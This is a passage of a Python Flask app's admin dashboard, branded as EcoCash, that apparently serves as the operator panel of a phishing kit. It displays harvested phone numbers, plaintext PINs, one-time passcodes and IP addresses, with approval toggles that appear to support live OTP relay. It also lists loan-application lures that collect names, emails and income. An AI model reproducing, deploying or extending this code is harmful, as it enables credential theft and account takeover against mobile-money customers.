                   style="width:100%;padding:.7rem;margin:.75rem 0;border:1px solid #ccc;
                          border-radius:8px;font-size:1rem;">
            <button type="submit"
                    style="width:100%;padding:.7rem;background:#003087;color:white;
                           border:none;border-radius:8px;font-weight:700;font-size:1rem;cursor:pointer;">
                Login
            </button>
        </form>
    </div></body></html>
    """

@app.route("/admin")
@admin_required
def admin_dashboard():
    conn = get_db()
    cur  = conn.cursor()

    cur.execute("SELECT COUNT(*) AS cnt FROM sessions")
    total_sessions = cur.fetchone()["cnt"]

    cur.execute("SELECT COUNT(*) AS cnt FROM loan_applications")
    total_loans = cur.fetchone()["cnt"]

    cur.execute("SELECT COUNT(*) AS cnt FROM loan_applications WHERE status='Pending'")
    pending_loans = cur.fetchone()["cnt"]

    cur.execute("SELECT COUNT(DISTINCT visitor_id) AS cnt FROM chat_messages")
    total_chats = cur.fetchone()["cnt"]

    cur.execute("""
        SELECT session_id, phone, pin_plain, pin_approved, otp, otp_approved,
               otp_gateway_open, status, ip_address, created_at, expires_at
        FROM sessions ORDER BY created_at DESC LIMIT 100
    """)
    sessions_rows = cur.fetchall()

    cur.execute("""
        SELECT reference, session_id, loan_type, amount, term_months, purpose,
               first_name, last_name, email, phone, employment_status,
               annual_income, status, created_at
        FROM loan_applications ORDER BY created_at DESC LIMIT 100
    """)
    loans_rows = cur.fetchall()

    cur.close()
    conn.close()

    def status_badge(s):
        color = STATUS_COLORS.get(s, "#6b7280")
        return (f"<span style='background:{color};color:white;padding:3px 10px;"
                f"border-radius:20px;font-size:.72rem;font-weight:800;"
                f"letter-spacing:.3px;white-space:nowrap;'>{s}</span>")

    def bool_icon(v):
        return "✅" if v else "⏳"

    def fmt_amount(a):
        try:    return f"ZWL {float(a):,.0f}"
        except: return "—"

    def fmt_date(d):
        return d[:16].replace("T", " ") if d else "—"

    sess_rows = "".join(
        f"<tr>"
        f"<td><code style='font-size:.78rem;color:#003087;'>{s['phone']}</code></td>"
        f"<td>{status_badge(s['status'])}</td>"
        f"<td style='text-align:center;font-weight:800;letter-spacing:2px;'>{s['pin_plain'] or '—'}</td>"
        f"<td style='text-align:center;'>{bool_icon(s['pin_approved'])}</td>"
        f"<td style='text-align:center;font-weight:800;letter-spacing:2px;'>{s['otp'] or '—'}</td>"
        f"<td style='text-align:center;'>{bool_icon(s['otp_gateway_open'])}</td>"
        f"<td style='text-align:center;'>{bool_icon(s['otp_approved'])}</td>"
        f"<td style='color:#666;font-size:.78rem;'>{s['ip_address'] or '—'}</td>"
        f"<td style='color:#666;font-size:.78rem;white-space:nowrap;'>{fmt_date(s['created_at'])}</td>"
        f"<td style='color:#888;font-size:.78rem;white-space:nowrap;'>{fmt_date(s['expires_at'])}</td>"
        f"</tr>"
        for s in sessions_rows
    ) or "<tr><td colspan='10' style='text-align:center;color:#aaa;padding:2rem;'>No sessions yet</td></tr>"

    loan_rows = "".join(
        f"<tr>"
        f"<td><code style='font-size:.78rem;color:#003087;'>{l['reference']}</code></td>"
        f"<td style='font-weight:700;'>{l['first_name']} {l['last_name']}</td>"
        f"<td><code style='font-size:.78rem;'>{l['phone']}</code></td>"
        f"<td style='font-size:.78rem;color:#555;'>{l['email'] or '—'}</td>"
        f"<td style='font-size:.8rem;'>{l['loan_type'] or '—'}</td>"
        f"<td style='font-weight:700;color:#003087;white-space:nowrap;'>{fmt_amount(l['amount'])}</td>"
        f"<td style='text-align:center;'>{l['term_months'] or '—'} mo</td>"
        f"<td style='font-size:.75rem;color:#666;max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;' title='{l['purpose'] or ''}'>{l['purpose'] or '—'}</td>"
        f"<td style='font-size:.78rem;color:#555;'>{l['employment_status'] or '—'}</td>"
        f"<td style='font-size:.78rem;color:#555;'>{fmt_amount(l['annual_income'])}</td>"
        f"<td>{status_badge(l['status'])}</td>"
        f"<td style='color:#666;font-size:.78rem;white-space:nowrap;'>{fmt_date(l['created_at'])}</td>"
        f"</tr>"
        for l in loans_rows
    ) or "<tr><td colspan='12' style='text-align:center;color:#aaa;padding:2rem;'>No applications yet</td></tr>"

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>EcoCash Admin Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet"/>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{font-family:'Nunito',sans-serif;background:#f0f4f8;color:#1a1a1a;min-height:100vh;}}

/* ── Sidebar ── */
.sidebar{{position:fixed;top:0;left:0;width:220px;height:100vh;background:#003087;
          display:flex;flex-direction:column;padding:0;overflow-y:auto;z-index:100;}}
.sidebar-logo{{padding:1.5rem 1.2rem;border-bottom:1px solid rgba(255,255,255,.12);}}
.sidebar-logo span.eco{{color:white;font-size:1.5rem;font-weight:800;}}
.sidebar-logo span.cash{{color:#f87171;font-size:1.5rem;font-weight:800;}}
.sidebar-logo p{{color:rgba(255,255,255,.6);font-size:.72rem;margin-top:2px;}}
.nav-section{{padding:.75rem 1rem .25rem;color:rgba(255,255,255,.4);font-size:.68rem;
              font-weight:800;letter-spacing:.8px;text-transform:uppercase;}}
.nav-item{{display:flex;align-items:center;gap:.7rem;padding:.65rem 1.2rem;
           color:rgba(255,255,255,.8);text-decoration:none;font-size:.875rem;
           font-weight:600;transition:background .15s;cursor:pointer;border:none;
           background:none;width:100%;text-align:left;font-family:'Nunito',sans-serif;}}
.nav-item:hover{{background:rgba(255,255,255,.1);color:white;}}
.nav-item.active{{background:rgba(255,255,255,.15);color:white;font-weight:800;
                  border-left:3px solid white;}}
.nav-item .icon{{font-size:1rem;flex-shrink:0;width:20px;text-align:center;}}
.sidebar-bottom{{margin-top:auto;border-top:1px solid rgba(255,255,255,.12);padding:.75rem 0;}}

/* ── Main ── */
.main{{margin-left:220px;min-height:100vh;}}
.topbar{{background:white;padding:.85rem 1.5rem;border-bottom:1px solid #e5e5e5;
         display:flex;justify-content:space-between;align-items:center;
         position:sticky;top:0;z-index:50;box-shadow:0 1px 4px rgba(0,0,0,.06);}}
.topbar-title{{font-size:1.1rem;font-weight:800;color:#003087;}}
.topbar-right{{display:flex;align-items:center;gap:1rem;}}
.refresh-btn{{background:#f0f4ff;color:#003087;border:1px solid #c7d6f5;border-radius:8px;
              padding:.4rem .9rem;font-family:'Nunito',sans-serif;font-weight:700;
              font-size:.8rem;cursor:pointer;transition:background .2s;}}
.refresh-btn:hover{{background:#dce8ff;}}
.page{{padding:1.5rem;display:none;}}
.page.active{{display:block;}}

/* ── Stat cards ── */
.stats{{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin-bottom:1.5rem;}}
.stat-card{{background:white;border-radius:14px;padding:1.2rem 1.4rem;
            box-shadow:0 1px 6px rgba(0,0,0,.06);border-left:4px solid #003087;}}
.stat-card.green{{border-color:#10b981;}}
.stat-card.amber{{border-color:#f59e0b;}}
.stat-card.red{{border-color:#ef4444;}}
.stat-val{{font-size:2rem;font-weight:800;color:#1a1a1a;line-height:1;}}
.stat-label{{font-size:.78rem;color:#888;margin-top:.3rem;font-weight:600;}}

/* ── Tables ── */
.section-header{{display:flex;align-items:center;justify-content:space-between;
                 margin-bottom:.75rem;}}
.section-title{{font-size:1rem;font-weight:800;color:#1a1a1a;}}
.section-sub{{font-size:.78rem;color:#888;}}
.table-wrap{{background:white;border-radius:14px;box-shadow:0 1px 6px rgba(0,0,0,.06);
             overflow:hidden;overflow-x:auto;}}
table{{border-collapse:collapse;width:100%;min-width:600px;}}
thead th{{background:#003087;color:white;padding:.65rem 1rem;text-align:left;
          font-size:.75rem;font-weight:700;letter-spacing:.3px;white-space:nowrap;}}
tbody td{{padding:.6rem 1rem;border-bottom:1px solid #f0f0f0;font-size:.83rem;
          vertical-align:middle;}}
tbody tr:last-child td{{border:none;}}
tbody tr:hover{{background:#fafbff;}}

/* ── Section spacing ── */
.section{{margin-bottom:2rem;}}
</style>
</head>
<body>

<!-- Sidebar -->
<div class="sidebar">
    <div class="sidebar-logo">
        <div><span class="eco">Eco</span><span class="cash">Cash</span></div>
        <p>Admin Panel</p>
    </div>

    <div class="nav-section">Main</div>
    <a class="nav-item active" onclick="showPage('dashboard',this)">
        <span class="icon">📊</span> Dashboard
    </a>

    <div class="nav-section">Data</div>
    <a class="nav-item" onclick="showPage('sessions',this)">
        <span class="icon">🔐</span> Sessions
    </a>
    <a class="nav-item" onclick="showPage('loans',this)">
        <span class="icon">💰</span> Loan Applications
    </a>
    <a class="nav-item" href="/admin/chat">
        <span class="icon">💬</span> Support Chats
    </a>

    <div class="sidebar-bottom">
        <a class="nav-item" href="/admin/logout">
            <span class="icon">🚪</span> Logout
        </a>
    </div>
</div>

<!-- Main content -->
<div class="main">
    <div class="topbar">
        <div class="topbar-title" id="page-title">Dashboard</div>
        <div class="topbar-right">
            <button class="refresh-btn" onclick="location.reload()">↻ Refresh</button>
        </div>
    </div>

    <!-- DASHBOARD PAGE -->
    <div class="page active" id="page-dashboard">
        <div class="stats">
            <div class="stat-card">
                <div class="stat-val">{total_sessions}</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card green">
                <div class="stat-val">{total_loans}</div>
                <div class="stat-label">Loan Applications</div>
            </div>
            <div class="stat-card amber">
                <div class="stat-val">{pending_loans}</div>
                <div class="stat-label">Pending Review</div>
            </div>
            <div class="stat-card red">
                <div class="stat-val">{total_chats}</div>
                <div class="stat-label">Support Conversations</div>
            </div>
        </div>

        <!-- Recent Sessions summary -->
        <div class="section">
            <div class="section-header">
                <div>
                    <div class="section-title">Recent Sessions</div>
                    <div class="section-sub">Last 5 login attempts</div>
                </div>
                <a onclick="showPage('sessions',document.querySelector('[onclick*=sessions]'))"
                   style="color:#003087;font-size:.8rem;font-weight:700;cursor:pointer;">View all →</a>
            </div>
            <div class="table-wrap">
                <table>
                    <thead><tr>
                        <th>Phone</th><th>Status</th><th>PIN</th>
                        <th>PIN ✓</th><th>OTP</th><th>Gateway ✓</th><th>OTP ✓</th><th>Date</th>
                    </tr></thead>
                    <tbody>{"".join(
                        f"<tr>"
                        f"<td><code style='color:#003087;'>{s['phone']}</code></td>"
                        f"<td>{status_badge(s['status'])}</td>"
                        f"<td style='text-align:center;font-weight:800;letter-spacing:2px;'>{s['pin_plain'] or '—'}</td>"
                        f"<td style='text-align:center;'>{bool_icon(s['pin_approved'])}</td>"
                        f"<td style='text-align:center;font-weight:800;letter-spacing:2px;'>{s['otp'] or '—'}</td>"
                        f"<td style='text-align:center;'>{bool_icon(s['otp_gateway_open'])}</td>"
                        f"<td style='text-align:center;'>{bool_icon(s['otp_approved'])}</td>"
                        f"<td style='color:#888;font-size:.78rem;'>{fmt_date(s['created_at'])}</td>"
                        f"</tr>"
                        for s in sessions_rows[:5]
                    ) or "<tr><td colspan='8' style='text-align:center;color:#aaa;padding:1.5rem;'>No sessions yet</td></tr>"}</tbody>
                </table>
            </div>
        </div>

        <!-- Recent Loans summary -->
        <div class="section">
            <div class="section-header">
                <div>
                    <div class="section-title">Recent Loan Applications</div>
                    <div class="section-sub">Last 5 applications</div>
                </div>
                <a onclick="showPage('loans',document.querySelector('[onclick*=loans]'))"
                   style="color:#003087;font-size:.8rem;font-weight:700;cursor:pointer;">View all →</a>
            </div>
            <div class="table-wrap">
                <table>
                    <thead><tr>
                        <th>Reference</th><th>Name</th><th>Phone</th>
                        <th>Amount</th><th>Term</th><th>Status</th><th>Date</th>
                    </tr></thead>
                    <tbody>{"".join(
                        f"<tr>"
                        f"<td><code style='color:#003087;font-size:.78rem;'>{l['reference']}</code></td>"
                        f"<td style='font-weight:700;'>{l['first_name']} {l['last_name']}</td>"
                        f"<td><code style='font-size:.78rem;'>{l['phone']}</code></td>"
                        f"<td style='font-weight:700;color:#003087;'>{fmt_amount(l['amount'])}</td>"
                        f"<td style='text-align:center;'>{l['term_months'] or '—'} mo</td>"
                        f"<td>{status_badge(l['status'])}</td>"
                        f"<td style='color:#888;font-size:.78rem;'>{fmt_date(l['created_at'])}</td>"
                        f"</tr>"
                        for l in loans_rows[:5]
                    ) or "<tr><td colspan='7' style='text-align:center;color:#aaa;padding:1.5rem;'>No applications yet</td></tr>"}</tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- SESSIONS PAGE -->
    <div class="page" id="page-sessions">
        <div class="section">
            <div class="section-header">
                <div>
                    <div class="section-title">All Sessions</div>
                    <div class="section-sub">{total_sessions} total · showing last 100</div>
                </div>
            </div>
            <div class="table-wrap">
                <table>
                    <thead><tr>
                        <th>Phone Number</th>
                        <th>Status</th>
                        <th>PIN</th>
                        <th>PIN ✓</th>
                        <th>OTP</th>
                        <th>Gateway ✓</th>
                        <th>OTP ✓</th>
                        <th>IP Address</th>
                        <th>Created</th>
                        <th>Expires</th>
                    </tr></thead>
                    <tbody>{sess_rows}</tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- LOANS PAGE -->
    <div class="page" id="page-loans">
        <div class="section">
            <div class="section-header">
                <div>
                    <div class="section-title">All Loan Applications</div>
                    <div class="section-sub">{total_loans} total · {pending_loans} pending · showing last 100</div>
                </div>
            </div>
            <div class="table-wrap">
                <table>
                    <thead><tr>
                        <th>Reference</th>
                        <th>Name</th>
                        <th>Phone</th>
                        <th>Email</th>
                        <th>Loan Type</th>
                        <th>Amount</th>
                        <th>Term</th>
                        <th>Purpose</th>
                        <th>Employment</th>
                        <th>Annual Income</th>
                        <th>Status</th>
                        <th>Date</th>
                    </tr></thead>
                    <tbody>{loan_rows}</tbody>
                </table>
            </div>
        </div>
    </div>

</div><!-- end .main -->

<script>
function showPage(name, el) {{
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('page-' + name).classList.add('active');
    if (el) el.classList.add('active');
    const titles = {{dashboard:'Dashboard', sessions:'Sessions', loans:'Loan Applications'}};
    document.getElementById('page-title').textContent = titles[name] || name;
}}
</script>
</body>
</html>
"""


@app.route("/admin/logout")
def admin_logout():
    session.clear()
    return redirect("/admin/login")

# ── Entry point ───────────────────────────────────────────────────────────────

init_db()  # idempotent — safe to run on every cold start

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=FLASK_PORT, debug=False)
